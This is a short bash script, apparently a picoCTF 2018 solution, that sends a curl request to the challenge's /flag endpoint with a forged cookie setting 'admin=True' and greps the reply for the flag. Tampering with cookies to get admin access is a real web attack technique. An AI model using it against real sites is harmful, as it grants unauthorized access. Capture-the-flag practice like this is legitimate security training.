#!/bin/bash

curl -i -s -k  -X $'GET' \
    -H $'Host: 2018shell.picoctf.com:5477' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cookie: _ga=GA1.2.457866812.1563051030; _gid=GA1.2.1455295744.1563657150; password=password; username=somethign; admin=True' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'_ga=GA1.2.457866812.1563051030; _gid=GA1.2.1455295744.1563657150; password=password; username=somethign; admin=True' \
    $'http://2018shell.picoctf.com:5477/flag' | grep -oE "picoCTF{.*}"
